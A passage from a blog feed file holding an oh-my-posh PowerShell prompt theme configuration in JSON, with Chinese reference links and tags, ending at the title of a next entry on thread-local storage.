class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;$schema&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://raw.githubusercontent.com/JanDeDobbeleer/oh-my-posh/main/themes/schema.json&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;blocks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">      <span class="attr">&quot;alignment&quot;</span><span class="punctuation">:</span> <span class="string">&quot;left&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">      <span class="attr">&quot;segments&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;background&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#F4AD35&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;foreground&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#011627&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;leading_diamond&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u256d\u2500\ue0b2&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;macos&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\uf179 &quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;ubuntu&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\uf31b &quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;windows&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\ue62a &quot;</span></span><br><span class="line"></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;diamond&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;template&quot;</span><span class="punctuation">:</span> <span class="string">&quot; &#123;&#123; if .WSL &#125;&#125;WSL at &#123;&#123; end &#125;&#125;&#123;&#123;.Icon&#125;&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;trailing_diamond&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;transparent,#F4AD35&gt;\ue0b2&lt;/&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;background&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#ED7827&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;foreground&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#011627&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;leading_diamond&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\ue0b2&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;time_format&quot;</span><span class="punctuation">:</span> <span class="string">&quot;15:04:05&quot;</span></span><br><span class="line"></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;diamond&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;template&quot;</span><span class="punctuation">:</span> <span class="string">&quot; \u2665 &#123;&#123; .CurrentDate | date .Format &#125;&#125; &quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;trailing_diamond&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;transparent,#ED7827&gt;\ue0b2&lt;/&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;background&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#59C9A5&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;foreground&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#ffffff&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;leading_diamond&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\ue0b2&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;diamond&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;template&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\ue266 CPU: &#123;&#123; round .PhysicalPercentUsed .Precision &#125;&#125;% | &quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sysinfo&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;background&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#59C9A5&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;foreground&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#ffffff&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;diamond&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;template&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RAM: &#123;&#123; (div ((sub .PhysicalTotalMemory .PhysicalFreeMemory)|float64) 1073741824.0) &#125;&#125;/&#123;&#123; (div .PhysicalTotalMemory 1073741824.0) &#125;&#125;GB \ue266 &quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;trailing_diamond&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;transparent,#59C9A5&gt;\ue0b2&lt;/&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sysinfo&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;background&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#4B95E9&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;foreground&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#d6deeb&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;leading_diamond&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\ue0b2&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;roundrock&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;threshold&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;diamond&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;template&quot;</span><span class="punctuation">:</span> <span class="string">&quot; &#123;&#123; .FormattedMs &#125;&#125; &quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;trailing_diamond&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\ue0b0&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;executiontime&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;prompt&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">      <span class="attr">&quot;alignment&quot;</span><span class="punctuation">:</span> <span class="string">&quot;right&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">      <span class="attr">&quot;segments&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;background&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#ffffff&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;foreground&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#000000&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;leading_diamond&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\ue0b2&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;fetch_package_manager&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;npm_icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot; &lt;#cc3a3a&gt;\ue5fa&lt;/&gt; &quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;yarn_icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot; &lt;#348cba&gt;\ue6a7&lt;/&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;diamond&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;template&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\ue718 &#123;&#123; if .PackageManagerIcon &#125;&#125;&#123;&#123; .PackageManagerIcon &#125;&#125; &#123;&#123; end &#125;&#125;&#123;&#123; .Full &#125;&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;trailing_diamond&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;transparent,#ffffff&gt;\ue0b2&lt;/&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;background&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#EE79D1&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;foreground&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#011627&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;leading_diamond&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\ue0b2&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;branch_icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\ue725 &quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;fetch_stash_count&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;fetch_status&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;fetch_upstream_icon&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;fetch_worktree_count&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;diamond&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;template&quot;</span><span class="punctuation">:</span> <span class="string">&quot; &#123;&#123; .UpstreamIcon &#125;&#125;&#123;&#123; .HEAD &#125;&#125;&#123;&#123;if .BranchStatus &#125;&#125; &#123;&#123; .BranchStatus &#125;&#125;&#123;&#123; end &#125;&#125;&#123;&#123; if .Working.Changed &#125;&#125; \uf044 &#123;&#123; .Working.String &#125;&#125;&#123;&#123; end &#125;&#125;&#123;&#123; if and (.Working.Changed) (.Staging.Changed) &#125;&#125; |&#123;&#123; end &#125;&#125;&#123;&#123; if .Staging.Changed &#125;&#125; \uf046 &#123;&#123; .Staging.String &#125;&#125;&#123;&#123; end &#125;&#125;&#123;&#123; if gt .StashCount 0 &#125;&#125; \ueb4b &#123;&#123; .StashCount &#125;&#125;&#123;&#123; end &#125;&#125; &quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;trailing_diamond&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\ue0b0&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;git&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;prompt&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">      <span class="attr">&quot;alignment&quot;</span><span class="punctuation">:</span> <span class="string">&quot;left&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">      <span class="attr">&quot;newline&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">      <span class="attr">&quot;segments&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;foreground&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#F4AD35&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;plain&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;template&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u2502&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;foreground&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#FFFFFF&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;plain&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;template&quot;</span><span class="punctuation">:</span> <span class="string">&quot;  Hello WAHAHA! Do one thing at a time, and do well!&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;prompt&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">      <span class="attr">&quot;alignment&quot;</span><span class="punctuation">:</span> <span class="string">&quot;left&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">      <span class="attr">&quot;newline&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">      <span class="attr">&quot;segments&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;foreground&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#F4AD35&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;plain&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;template&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u2570\u2500[&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;foreground&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#ffafd2&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;folder_icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\uf07b&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;home_icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\b\b\uF108 home&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;agnoster_full&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;folder_separator_icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;mapped_locations&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">              <span class="attr">&quot;D:\\Data\\code&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\b\b\uF121 D:/Data/code&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">              <span class="attr">&quot;D:\\Data\\CTF&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\b\b\uF21B D:/Data/CTF&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">              <span class="attr">&quot;D:\\Data\\\u6587\u6863&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\b\b\uF15C D:/Data/\u6587\u6863&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">              <span class="attr">&quot;E:\\&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\b\b\uF0AD E:/&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;diamond&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;template&quot;</span><span class="punctuation">:</span> <span class="string">&quot; \ue5ff &#123;&#123; .Path &#125;&#125; &quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;path&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;foreground&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#F4AD35&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;plain&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;template&quot;</span><span class="punctuation">:</span> <span class="string">&quot;] &quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;foreground&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#17e528&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;foreground_templates&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;&#123;&#123; if gt .Code 0 &#125;&#125;#f00000&#123;&#123; end &#125;&#125;&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;always_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;plain&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;template&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\uD83E\uDD23\ud83d\udc49 \uf155 &quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;status&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;prompt&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;console_title_template&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;&#123; .Folder &#125;&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;transient_prompt&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;background&quot;</span><span class="punctuation">:</span> <span class="string">&quot;transparent&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;foreground&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#FEF5ED&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;template&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-------------------------------------------------------------------\n&gt; &quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="附注">附注</h1><p>参考:</p><ul><li><a href="https://www.cnblogs.com/watalo/p/16407059.html">https://www.cnblogs.com/watalo/p/16407059.html</a></li><li><a href="https://blog.csdn.net/qq_21689457/article/details/129345662">https://blog.csdn.net/qq_21689457/article/details/129345662</a></li><li>官方文档: <a href="https://ohmyposh.dev/docs">https://ohmyposh.dev/docs</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> powershell </tag>
            
            <tag> oh-my-posh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TLS-线程局部存储</title>
      <link href="/202450e479100bad/"/>
      <url>/202450e479100bad/</url>
      
